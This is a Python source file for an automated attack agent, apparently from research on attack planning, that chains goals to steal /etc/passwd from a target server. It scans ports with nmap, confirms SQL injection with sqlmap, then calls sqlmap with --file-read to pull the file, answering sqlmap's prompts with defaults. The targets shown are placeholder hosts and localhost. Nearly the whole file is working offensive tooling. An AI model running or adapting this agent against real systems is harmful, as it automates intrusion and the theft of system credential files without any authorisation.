from dash import readAgent, known, primitiveActions, agentLoop, isConstant, knownTuple
import subprocess

readAgent("""

goalWeight readFile(!server3, !/etc/passwd) 1

goalRequirements readFile(target, file)
  SQLVulnerability(target, port, baseUrl, parameter)
  reachable(attackLoc, target)
  SQLInjectionReadFile(attackLoc, target, file, port, baseUrl, parameter)

goalRequirements SQLVulnerability(target, port, baseUrl, parameter)
  likelyVulnerability(target, port, baseUrl, parameter)
  service(target, port, protocol)
  checkSQLVulnerability(target, port, baseUrl, parameter)
  http-style(protocol)

goalRequirements service(target, port, protocol)
  portScanner(target, port, protocol)

# this predicate means the information is known, and also records
# that a subgoal has been achieved
known likelyVulnerability(!server1, !80, !cards.php, !select)
known likelyVulnerability(!server3, !80, !cards.php, !select)
known likelyVulnerability(!localhost, !80, !index.html, !name)

known reachable(anywhere, !server1)
known reachable(anywhere, !server3)
known reachable(anywhere, !localhost)

""")

# This says what values from portScanner are likely to be attackable through http/sql injection
for protocol in ['http', 'http-alt', 'http-proxy', 'sun-answerbook']:
    known('http-style', ['!' + protocol])

# This is just to test the top goal
#known(('SQLVulnerability', '!server1', 80, '!index.html', '!name'))


# Define primitive actions by specifying the bound variables in the input
# and returning a list of tuples of the other variables.
# Later could return an iterator for efficiency.
# Currently since the function is passed into the performAction method,
# there can only be one argument. Will fix.

# 'action' is a term, e.g. ('portScanner', '!server1', !80, 'protocol')
def portScanner(action):
    # Will expand to a call to nmap here
    print "called portScanner with", action
    # Host needs to be bound
    [host, portVar, protocolVar] = action[1:]
    if not isConstant(host):
        print "Host needs to be bound on calling portScanner:", host
        return False
    bindingsList = []
    readingPorts = False
    proc = None
    try:
        proc = subprocess.check_output(["nmap", host[1:]]).split('\n') # runs nmap if it's in the path
    except:
        print "Unable to run nmap"
        return {}
    for line in proc:
        words = line.split()
        if not readingPorts and len(words) > 0 and words[0] == "PORT":
            readingPorts = True
        elif readingPorts and len(words) >= 3 and words[1] != 'done:':
            # each line like this is a port and protocol, 
            # which may not match what we're looking for based on input bindings
            port = "!" + words[0][0:words[0].find("/")]  # remove '/tcp'
            protocol = "!" + words[2]
            # This returns all the results that match.
            # Also records every result just so nmap isn't run more than
            # necessary if a different port or protocol is explored later.
            knownTuple((action[0], host, port, protocol))
            if not isConstant(portVar) and not isConstant(protocolVar):
                bindingsList.append({portVar: port, protocolVar: protocol})
            elif portVar == port and not isConstant(protocolVar):
                bindingsList.append({protocolVar: protocol})
            elif not isConstant(portVar) and protocolVar == protocol:
                bindingsList.append({portVar: port})
            elif portVar == port and protocolVar == protocol:
                bindingsList.append({})   # constants all match, record success
    return bindingsList

SQLMapHome = "/users/blythe/attack/sqlmap"

def sqlMap(action):
    print "Called sql map with action", action
    # Expect everything to be bound and use sqlmap to check there is a vulnerability there
    # Remove the prefix exclamation marks
    [host, port, base, parameter] = [arg[1:] for arg in action[1:]]
    proc = None
    call = ["python", SQLMapHome + "/sqlmap.py", "-u", "http://" + host + ":" + port + "/" + base + "?" + parameter + "=1"]
    try:
        proc = subprocess.Popen(call,stdin=subprocess.PIPE,stdout=subprocess.PIPE)
    except BaseException as e:
        print "Unable to run sqlmap:", e
        return []
    result = []
    printing = False
    seenDashes = 0  # follow the same algorithm for printing as the original java version
    line = proc.stdout.readline()
    control = ''
    for i in range(1,32):
        control += chr(i)
    while line != "":
        # Try removing all control characters and printing
        line = line.translate(None, control)
        if "the following injection point" in line:    # found at least one injection point
            result = [{}]    # This would signify success without adding new bindings
            printing = True
        if printing:
            print("SQLMap: " + line)
            if "---" in line:
                seenDashes += 1
                if seenDashes == 2:
                    printing = False
        if "o you want to" in line:
            print "SQLMap (answering):", line
            proc.stdin.write('\n')    # take the default option
        if "starting" or "shutting down" in line:
            print "SQLMap:", line
        if "shutting down" in line:
            line = ""
        line = proc.stdout.readline()
    print "Finished sqlmap"
    print proc.communicate()
    return result

def sqlInjectionReadFile(args):
    print "Performing sql injection attack to read a file with args", args
    [source, target, targetFile, port, baseUrl, parameter] = [arg[1:] for arg in args[1:]]  # assume constants, remove !
    # Call is very similar to sqlMap above with an extra --file-read argument
    result = []
    try:
        call = ["python", SQLMapHome + "/sqlmap.py", "-u",
                "http://" + target + ":" + port + "/" + baseUrl + "?" + parameter + "=1",
                "--file-read=" + targetFile]
        proc = subprocess.Popen(call, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        # The java sends three carriage returns - here I look for lines asking questions and send them
        control = ''
        for i in range(1,32):
            control += chr(i)
        line = proc.stdout.readline()
        while line != "":
            line = line.translate(None, control)
            print "SQLMap read:", line
            if 'o you want to' in line:
                print "Sending default answer:", line
                proc.stdin.write('\n')
            if "the local file" in line:
                result = [{}]
            line = proc.stdout.readline()
    except BaseException as e:
        print "Unable to run sqlmap to read file:", e
    return result

primitiveActions([('SQLInjectionReadFile', sqlInjectionReadFile), 
                  ('portScanner', portScanner),
                  ('checkSQLVulnerability', sqlMap)])

# Figure out the next action to take
agentLoop(maxIterations=3)

